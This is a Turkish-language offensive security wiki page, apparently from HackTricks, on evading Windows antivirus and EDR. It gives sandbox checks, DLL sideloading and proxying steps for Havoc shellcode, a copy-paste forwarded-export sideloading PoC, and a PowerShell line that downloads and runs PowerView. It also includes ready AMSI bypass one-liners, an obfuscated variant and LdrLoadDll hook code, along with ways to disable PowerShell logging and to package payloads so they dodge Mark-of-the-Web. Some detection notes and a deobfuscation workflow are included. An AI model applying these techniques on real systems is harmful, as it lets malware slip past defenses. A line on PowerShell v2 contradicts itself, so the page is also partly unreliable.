# Antivirüs (AV) Atlatma

{{#include ../banners/hacktricks-training.md}}

**Bu sayfa [**@m2rc_p**](https://twitter.com/m2rc_p) tarafından yazıldı!**

## Defender'ı Durdurma

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender'ın çalışmasını durdurmak için bir araç.
- [no-defender](https://github.com/es3n1n/no-defender): Başka bir AV'yi taklit ederek Windows Defender'ın çalışmasını durdurmak için bir araç.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Kaçış Metodolojisi**

Şu anda AV'ler bir dosyanın zararlı olup olmadığını kontrol etmek için farklı yöntemler kullanıyor: statik tespit, dinamik analiz ve daha gelişmiş EDR'ler için davranışsal analiz.

### **Statik tespit**

Statik tespit, ikili dosya veya betikte bilinen zararlı string'leri veya byte dizilerini işaretleyerek ve ayrıca dosyanın kendisinden bilgi çıkararak (ör. file description, company name, digital signatures, icon, checksum vb.) gerçekleştirilir. Bu, bilinen açık araçları kullanmanın sizi daha kolay yakalayabileceği anlamına gelir çünkü bunlar muhtemelen analiz edilip zararlı olarak işaretlenmiştir. Bu tür tespiti aşmanın birkaç yolu vardır:

- **Şifreleme**

Eğer ikiliyi şifrelerseniz, AV programınızın programınızı tespit etme yolu kalmaz; ancak programı bellekte çözmek ve çalıştırmak için bir loader'a ihtiyacınız olacaktır.

- **Obfuscation**

Bazen AV'yi atlatmak için ikili veya betikteki bazı string'leri değiştirmek yeterlidir, ancak neyi gizlemeye çalıştığınıza bağlı olarak bu zaman alıcı olabilir.

- **Özel araçlar**

Kendi araçlarınızı geliştirirseniz, bilinen kötü imzalar olmaz, ancak bu çok fazla zaman ve çaba gerektirir.

> [!TIP]
> Windows Defender statik tespiti karşı kontrol etmek için iyi bir yöntem [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Bu araç dosyayı birden çok segmente böler ve ardından Defender'a her birini ayrı ayrı taratır; böylece ikilinizde hangi string'lerin veya byte'ların işaretlendiğini tam olarak söyleyebilir.

Bu konuda pratik AV Kaçış ile ilgili olarak bu [YouTube oynatma listesini](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) mutlaka incelemenizi tavsiye ederim.

### **Dinamik analiz**

Dinamik analiz, AV'nin ikilinizi bir sandbox içinde çalıştırıp zararlı faaliyeti (ör. tarayıcı parolalarını çözmeye ve okumaya çalışmak, LSASS üzerinde minidump almak vb.) izlemesi durumudur. Bu kısım biraz daha zor olabilir, ama sandbox'ları atlatmak için yapabileceğiniz bazı şeyler şunlardır.

- **Uyku (sleep) eklemek** Uygulanma şekline bağlı olarak, bu AV'nin dinamik analizini atlatmak için harika bir yol olabilir. AV'lerin kullanıcı iş akışını kesintiye uğratmamak için dosyaları taramak üzere çok kısa bir süreleri vardır, bu yüzden uzun uyumalar ikililerin analizini bozabilir. Sorun şu ki, birçok AV sandbox'ı uyumayı uygulama şekline bağlı olarak atlayabilir.
- **Makine kaynaklarını kontrol etme** Genellikle Sandbox'ların çalışacak çok az kaynağı vardır (ör. < 2GB RAM), aksi takdirde kullanıcının makinesini yavaşlatabilirler. CPU sıcaklığını veya fan hızlarını kontrol etmek gibi çok yaratıcı yöntemler de kullanabilirsiniz; sandbox içinde her şey uygulanmış olmayacaktır.
- **Makine-özgü kontroller** Hedefinin workstation'ı "contoso.local" domain'ine bağlı bir kullanıcıysa, bilgisayarın domain'ini kontrol ederek sizin belirttiğinizle eşleşip eşleşmediğini görebilirsiniz; eşleşmiyorsa programınızı sonlandırabilirsiniz.

Ortaya çıktığına göre Microsoft Defender'ın Sandbox bilgisayar adı HAL9TH, bu yüzden zararlı yazılımınızı çalıştırmadan önce bilgisayar adını kontrol edebilirsiniz; ad HAL9TH ise Defender'ın sandbox'ındasınız demektir ve programınızı sonlandırabilirsiniz.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>kaynak: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandbox'lara karşı gitmek için [@mgeeky](https://twitter.com/mariuszbit)'in bazı diğer gerçekten iyi ipuçları

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev kanalı</p></figcaption></figure>

Bu yazıda daha önce söylediğimiz gibi, **kamuya açık araçlar** sonunda **tespit edilecektir**, bu yüzden kendinize şunu sormalısınız:

Örneğin, LSASS'i dökmek istiyorsanız, **gerçekten mimikatz kullanmanız mı gerekiyor**? Yoksa LSASS'i döken daha az bilinen farklı bir proje kullanabilir misiniz?

Doğru cevap muhtemelen ikincisidir. Örneğin mimikatz alırsak, AV'ler ve EDR'ler tarafından muhtemelen en çok işaretlenen zararlı yazılımlardan biridir; proje kendisi çok havalı olsa da, AV'leri atlatmak için onunla çalışmak kabus olabilir, bu yüzden başarmaya çalıştığınız şey için alternatifler arayın.

> [!TIP]
> Kaçış için payload'larınızı değiştirirken, defender'da otomatik örnek gönderimini kapattığınızdan emin olun ve lütfen, ciddiyim, uzun vadede kaçış elde etmeyi hedefliyorsanız **VIRUSTOTAL'A YÜKLEMEYİN**. Payload'ınızın belirli bir AV tarafından tespit edilip edilmediğini kontrol etmek istiyorsanız, onu bir VM'e kurun, otomatik örnek gönderimini kapatmaya çalışın ve sonuçtan memnun olana kadar orada test edin.

## EXE'ler vs DLL'ler

Mümkün olduğunda her zaman kaçış için **DLL'leri kullanmayı önceliklendirin**, deneyimlerime göre DLL dosyaları genellikle **çok daha az tespit** ediliyor ve analiz ediliyor, bu yüzden bazı durumlarda tespiti önlemek için kullanabileceğiniz çok basit bir hiledir (tabii payload'ınızın bir DLL olarak çalıştırılma yolu varsa).

Bu resimde gördüğümüz gibi, Havoc'tan bir DLL Payload'ın antiscan.me üzerinde tespit oranı 4/26 iken, EXE payload'un tespit oranı 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me normal bir Havoc EXE payload ile normal bir Havoc DLL'in karşılaştırması</p></figcaption></figure>

Şimdi DLL dosyalarıyla çok daha gizli olmanızı sağlayacak bazı taktikleri göstereceğiz.

## DLL Sideloading & Proxying

**DLL Sideloading**, loader tarafından kullanılan DLL arama sırasından faydalanarak kurban uygulama ile kötü amaçlı payload(lar)ı yan yana konumlandırmayı içerir.

DLL Sideloading'e yatkın programları [Siofra](https://github.com/Cybereason/siofra) ve aşağıdaki powershell script'ini kullanarak kontrol edebilirsiniz:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Bu komut, "C:\Program Files\\" içindeki DLL hijacking'e açık programların ve yüklemeye çalıştıkları DLL dosyalarının listesini çıktılayacaktır.

Kesinlikle **explore DLL Hijackable/Sideloadable programs yourself**, bu teknik doğru yapıldığında oldukça stealthy'dir; ancak kamuya açık bilinen DLL Sideloadable programları kullanırsanız kolayca yakalanabilirsiniz.

Bir programın yüklemesini beklediği ada sahip bir malicious DLL yerleştirmeniz tek başına payload'unuzu çalıştırmayacaktır; çünkü program o DLL içinde bazı belirli fonksiyonlar bekler. Bu sorunu çözmek için **DLL Proxying/Forwarding** adlı başka bir teknik kullanacağız.

**DLL Proxying** bir programın proxy (ve malicious) DLL üzerinden yaptığı çağrıları orijinal DLL'ye iletir; böylece programın işlevselliğini korur ve payload'unuzun yürütülmesini yönetebilir.

Bu amaçla [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) projesini [@flangvik](https://twitter.com/Flangvik/) tarafından kullanacağım.

İzlediğim adımlar:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Son komut bize 2 dosya verecek: bir DLL kaynak kodu şablonu ve orijinal yeniden adlandırılmış DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Bunlar elde edilen sonuçlar:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Hem shellcode'umuz (encoded with [SGN](https://github.com/EgeBalci/sgn)) hem de proxy DLL'imiz [antiscan.me](https://antiscan.me) üzerinde 0/26 Detection rate'e sahip! Bunu bir başarı olarak nitelendiririm.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> DLL Sideloading hakkında daha derinlemesine bilgi edinmek için [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) ve ayrıca [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) izlemenizi **şiddetle tavsiye ederim**.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modülleri aslında "forwarder" olan fonksiyonları export edebilir: kodu işaret etmek yerine, export girdisi `TargetDll.TargetFunc` biçiminde bir ASCII stringi içerir. Bir çağırıcı export'u çözdüğünde, Windows loader şunları yapacaktır:

- `TargetDll` yüklü değilse yükler
- Ondan `TargetFunc`'ı çözer

Anlaşılması gereken temel davranışlar:
- Eğer `TargetDll` bir KnownDLL ise, korunmuş KnownDLLs namespace'inden sağlanır (ör. ntdll, kernelbase, ole32).
- Eğer `TargetDll` bir KnownDLL değilse, normal DLL arama sırası kullanılır; bu, forward çözümlemesini yapan modülün dizinini de içerir.

Bu, dolaylı bir sideloading primitive'ini mümkün kılar: export'u non-KnownDLL bir modül adına forward edilmiş bir fonksiyona sahip signed DLL bulun, sonra bu signed DLL'i iletilen hedef modülle tamamen aynı ada sahip attacker-controlled bir DLL ile aynı dizine koyun. İletilen export çağrıldığında, loader forward'ı çözer ve DLL'inizi aynı dizinden yükleyip DllMain'inizi çalıştırır.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` bir KnownDLL değildir, bu yüzden normal arama sırasına göre çözülür.

PoC (kopyala-yapıştır):
1) İmzalı sistem DLL'i yazılabilir bir klasöre kopyalayın
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Aynı klasöre kötü amaçlı bir `NCRYPTPROV.dll` bırakın. Kod yürütme için minimal bir `DllMain` yeterlidir; `DllMain`'i tetiklemek için forwarded function'ı uygulamanıza gerek yoktur.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) İmzalı bir LOLBin ile forward'ı tetikleyin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Gözlemlenen davranış:
- `rundll32` (imzalı) side-by-side `keyiso.dll` (imzalı) yükler
- `KeyIsoSetAuditingInterface` çözümlenirken, loader forward'ı `NCRYPTPROV.SetAuditingInterface`'e takip eder
- Loader ardından `C:\test`'ten `NCRYPTPROV.dll` yükler ve onun `DllMain`'ini çalıştırır
- Eğer `SetAuditingInterface` uygulanmamışsa, yalnızca `DllMain` çalıştıktan sonra "missing API" hatası alırsınız

Tespit ipuçları:
- Hedef modülün KnownDLL olmadığı forwarded exports'lara odaklanın. KnownDLLs, `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` altında listelenir.
- Forwarded exports'ları şu araçlarla listeleyebilirsiniz:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Adayları aramak için Windows 11 forwarder envanterine bakın: https://hexacorn.com/d/apis_fwd.txt

Tespit/defans fikirleri:
- LOLBins (ör. rundll32.exe) izleyin; non-system yollarından imzalı DLL'leri yüklediğinde ve ardından aynı temel ada sahip non-KnownDLL'leri o dizinden yüklediğinde
- Kullanıcı yazılabilir yollar altında `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` gibi süreç/modül zincirleri için uyarı verin
- Kod bütünlüğü politikalarını (WDAC/AppLocker) uygulayın ve uygulama dizinlerinde write+execute izinlerini reddedin

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze, suspended processes, direct syscalls ve alternative execution methods kullanarak EDRs'i atlatmak için bir payload toolkit'idir`

Freeze'ı shellcode'unuzu gizli bir şekilde yükleyip çalıştırmak için kullanabilirsiniz.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion sadece bir kedi ve fare oyunudur; bugün işe yarayan yarın tespit edilebilir, bu yüzden asla yalnızca bir araca güvenmeyin — mümkünse birden fazla evasion tekniğini zincirlemeyi deneyin.

## AMSI (Anti-Malware Scan Interface)

AMSI, "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)"ı önlemek için oluşturuldu. Başlangıçta AVs sadece diskteki dosyaları tarayabiliyordu; bu yüzden payload'ları doğrudan in-memory olarak çalıştırabiliyorsanız, AV bunu önleyemiyordu çünkü yeterli görünürlüğe sahip değildi.

AMSI özelliği Windows'un şu bileşenlerine entegre edilmiştir.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Bu, antivirüs çözümlerinin betik içeriğini hem şifrelenmemiş hem de unobfuscated bir biçimde açığa çıkararak betik davranışını incelemesine olanak tanır.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Gördüğünüz gibi başına `amsi:` ekliyor ve ardından script'in çalıştığı yürütülebilir dosyanın yolunu gösteriyor; bu örnekte powershell.exe

Disk'e hiçbir dosya bırakmadık, ancak AMSI nedeniyle yine de in-memory olarak yakalandık.

Dahası, starting with **.NET 4.8**, C# kodu da AMSI tarafından işleniyor. Bu, hatta `Assembly.Load(byte[])` ile in-memory yüklemeyi bile etkiliyor. Bu nedenle, AMSI'den kaçmak istiyorsanız in-memory yürütme için daha düşük .NET sürümlerinin (ör. 4.7.2 veya daha eski) kullanılması önerilir.

AMSI'den kaçmanın birkaç yolu vardır:

- **Obfuscation**

AMSI esas olarak statik tespitlerle çalıştığı için, yüklemeye çalıştığınız scriptleri değiştirmek tespitten kaçınmak için iyi bir yol olabilir.

Ancak AMSI, scriptleri birden fazla katman olsa bile unobfuscating yeteneğine sahip olduğundan, obfuscation nasıl yapıldığına bağlı olarak kötü bir seçenek olabilir. Bu da kaçınmayı o kadar basit yapmaz. Yine de bazen yapmanız gereken tek şey birkaç değişken ismini değiştirmek olur; bu nedenle ne kadarının işaretlendiğine bağlıdır.

- **AMSI Bypass**

AMSI, powershell (aynı zamanda cscript.exe, wscript.exe, vb.) sürecine bir DLL yükleyerek uygulanır; bu yüzden ayrıcalıksız bir kullanıcı olarak çalışırken bile ona müdahale etmek mümkündür. AMSI'nin bu uygulanışındaki kusur nedeniyle araştırmacılar AMSI taramasından kaçmak için birden fazla yöntem bulmuşlardır.

**Forcing an Error**

AMSI başlatılmasının başarısız olmasını (amsiInitFailed) zorlamak, mevcut süreç için hiçbir taramanın başlatılmaması ile sonuçlanır. Bu yöntem ilk olarak [Matt Graeber](https://twitter.com/mattifestation) tarafından ifşa edildi ve Microsoft daha geniş kullanımını önlemek için bir signature geliştirdi.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Mevcut powershell süreci için AMSI'yi kullanılamaz hale getirmek sadece tek bir powershell satırı aldı. Bu satır elbette AMSI tarafından işaretlendi, bu yüzden bu tekniği kullanmak için bazı değişiklikler gerekiyor.

İşte bu [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)ten aldığım değiştirilmiş bir AMSI bypass.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Unutmayın, bu gönderi yayınlandığında muhtemelen işaretlenecektir; tespit edilmeden kalmayı planlıyorsanız herhangi bir kod yayımlamamalısınız.

**Memory Patching**

Bu teknik ilk olarak [@RastaMouse](https://twitter.com/_RastaMouse/) tarafından keşfedildi ve kullanıcı tarafından sağlanan girdiyi taramaktan sorumlu "AmsiScanBuffer" fonksiyonunun adresini amsi.dll içinde bulmayı ve onu E_INVALIDARG kodunu döndürecek talimatlarla üzerine yazmayı içerir; bu sayede gerçek taramanın sonucu 0 döner ve bu temiz sonuç olarak yorumlanır.

> [!TIP]
> Daha ayrıntılı açıklama için https://rastamouse.me/memory-patching-amsi-bypass/ adresini okuyun.

AMSI'yi powershell ile atlatmak için kullanılan birçok başka teknik de vardır; bunları öğrenmek için [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) ve [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) adreslerine bakın.

### amsi.dll yüklenmesini önleyerek AMSI'yi engelleme (LdrLoadDll hook)

AMSI, yalnızca `amsi.dll` mevcut işleme yüklendikten sonra başlatılır. Dil bağımsız, sağlam bir atlatma yöntemi, istenen modül `amsi.dll` olduğunda hata döndüren bir kullanıcı-modu hook'unu `ntdll!LdrLoadDll` üzerine yerleştirmektir. Sonuç olarak, AMSI hiç yüklenmez ve o işlem için tarama yapılmaz.

Uygulama taslağı (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notlar
- Works across PowerShell, WScript/CScript and custom loaders alike (anything that would otherwise load AMSI).
- Pair with feeding scripts over stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) to avoid long command‑line artefacts.
- Seen used by loaders executed through LOLBins (e.g., `regsvr32` calling `DllRegisterServer`).

This tools [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**Tespit edilen imzayı kaldırma**

Mevcut işlemin belleğindeki AMSI imzasını kaldırmak için **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** ve **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** gibi araçları kullanabilirsiniz. Bu araç, mevcut işlemin belleğini AMSI imzası için tarar ve ardından onu NOP instructions ile üzerine yazarak etkili bir şekilde bellekten kaldırır.

**AMSI kullanan AV/EDR ürünleri**

AMSI kullanan AV/EDR ürünlerinin listesini **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** adresinde bulabilirsiniz.

**PowerShell sürüm 2'yi kullanın**
PowerShell sürüm 2'yi kullanırsanız, AMSI yüklenmeyecektir; bu nedenle scriptlerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Bunu yapabilirsiniz:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging is a feature that allows you to log all PowerShell commands executed on a system. This can be useful for auditing and troubleshooting purposes, but it can also be a **problem for attackers who want to evade detection**.

PowerShell logging'i atlatmak için aşağıdaki teknikleri kullanabilirsiniz:

- **Disable PowerShell Transcription and Module Logging**: Bu amaçla [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) gibi bir araç kullanabilirsiniz.
- **Use Powershell version 2**: PowerShell sürüm 2'yi kullanırsanız, AMSI yüklenecektir, bu yüzden betiklerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Bunu şu şekilde yapabilirsiniz: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kullanarak savunmalar olmadan bir powershell başlatabilirsiniz (bu, `powerpick`'in Cobal Strike'dan kullandığı yöntemdir).


## Obfuscation

> [!TIP]
> Several obfuscation techniques relies on encrypting data, which will increase the entropy of the binary which will make easier for AVs and EDRs to detect it. Be careful with this and maybe only apply encryption to specific sections of your code that is sensitive or needs to be hidden.

### Deobfuscating ConfuserEx-Protected .NET Binaries

When analysing malware that uses ConfuserEx 2 (or commercial forks) it is common to face several layers of protection that will block decompilers and sandboxes.  The workflow below reliably **restores a near–original IL** that can afterwards be decompiled to C# in tools such as dnSpy or ILSpy.

1.  Anti-tampering removal – ConfuserEx encrypts every *method body* and decrypts it inside the *module* static constructor (`<Module>.cctor`).  This also patches the PE checksum so any modification will crash the binary.  Use **AntiTamperKiller** to locate the encrypted metadata tables, recover the XOR keys and rewrite a clean assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Çıktı, kendi unpacker'ınızı oluştururken faydalı olabilecek 6 anti-tamper parametresini (`key0-key3`, `nameHash`, `internKey`) içerir.

2.  Symbol / control-flow recovery – feed the *clean* file to **de4dot-cex** (a ConfuserEx-aware fork of de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – select the ConfuserEx 2 profile
• de4dot will undo control-flow flattening, restore original namespaces, classes and variable names and decrypt constant strings.

3.  Proxy-call stripping – ConfuserEx replaces direct method calls with lightweight wrappers (a.k.a *proxy calls*) to further break decompilation.  Remove them with **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
After this step you should observe normal .NET API such as `Convert.FromBase64String` or `AES.Create()` instead of opaque wrapper functions (`Class8.smethod_10`, …).

4.  Manual clean-up – run the resulting binary under dnSpy, search for large Base64 blobs or `RijndaelManaged`/`TripleDESCryptoServiceProvider` use to locate the *real* payload.  Often the malware stores it as a TLV-encoded byte array initialised inside `<Module>.byte_0`.

The above chain restores execution flow **without** needing to run the malicious sample – useful when working on an offline workstation.

> 🛈  ConfuserEx produces a custom attribute named `ConfusedByAttribute` that can be used as an IOC to automatically triage samples.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Bu projenin amacı, [LLVM](http://www.llvm.org/) derleme paketinin açık kaynaklı bir fork'unu sağlayarak yazılım güvenliğini [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) ve tamper-proofing yoluyla artırmaktır.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator, `C++11/14` dilinin derleme zamanında, herhangi bir harici araç kullanmadan ve derleyiciyi değiştirmeden obfuscated code üretmek için nasıl kullanılacağını gösterir.
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming framework tarafından üretilen bir katman obfuscated operations ekleyerek uygulamayı kırmak isteyen kişinin işini biraz daha zorlaştırır.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz, .exe, .dll, .sys gibi çeşitli PE dosyalarını obfuscate edebilen x64 binary obfuscator'dır.
- [**metame**](https://github.com/a0rtega/metame): Metame, rastgele yürütülebilir dosyalar için basit bir metamorphic code motorudur.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator, ROP (return-oriented programming) kullanan LLVM-supported diller için ince taneli bir code obfuscation framework'üdür. ROPfuscator, normal talimatları ROP zincirlerine dönüştürerek bir programı assembly code seviyesinde obfuscate eder ve normal kontrol akışı kavrayışımızı zorlaştırır.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt, Nim ile yazılmış bir .NET PE Crypter'dır.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor, mevcut EXE/DLL dosyalarını shellcode'a dönüştürebilir ve sonra bunları yükleyebilir.

## SmartScreen & MoTW

İnternetten bazı yürütülebilir dosyaları indirip çalıştırdığınızda bu ekranı görmüş olabilirsiniz.

Microsoft Defender SmartScreen, son kullanıcıyı potansiyel olarak kötü amaçlı uygulamaları çalıştırmaktan korumayı amaçlayan bir güvenlik mekanizmasıdır.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen esas olarak itibar tabanlı bir yaklaşımla çalışır; nadiren indirilen uygulamalar SmartScreen'i tetikler ve böylece dosyanın çalıştırılmasını engeller (dosya hâlâ More Info -> Run anyway tıklanarak çalıştırılabilir).

**MoTW** (Mark of The Web), internetten indirilen dosyalar üzerine otomatik olarak oluşturulan ve indirme yapıldığı URL ile birlikte kaydedilen Zone.Identifier adlı bir [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)'dir.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>İnternetten indirilen bir dosyanın Zone.Identifier ADS'sini kontrol etme.</p></figcaption></figure>

> [!TIP]
> Güvenilir bir imza sertifikası ile imzalanmış çalıştırılabilir dosyaların SmartScreen'i tetiklemeyeceğini unutmamak önemlidir.

Payload'larınızın Mark of The Web almasını engellemenin çok etkili bir yolu, bunları ISO gibi bir kapsayıcı içine paketlemektir. Bunun nedeni, Mark-of-the-Web (MOTW)'ün **non NTFS** hacimlere uygulanamamasıdır.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) payload'ları Mark-of-the-Web'den kaçmak için çıktı konteynerlerine paketleyen bir araçtır.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW), Windows'ta uygulamaların ve sistem bileşenlerinin **olayları kaydetmesine** izin veren güçlü bir günlükleme mekanizmasıdır. Ancak, aynı zamanda güvenlik ürünleri tarafından kötü amaçlı etkinlikleri izlemek ve tespit etmek için de kullanılabilir.

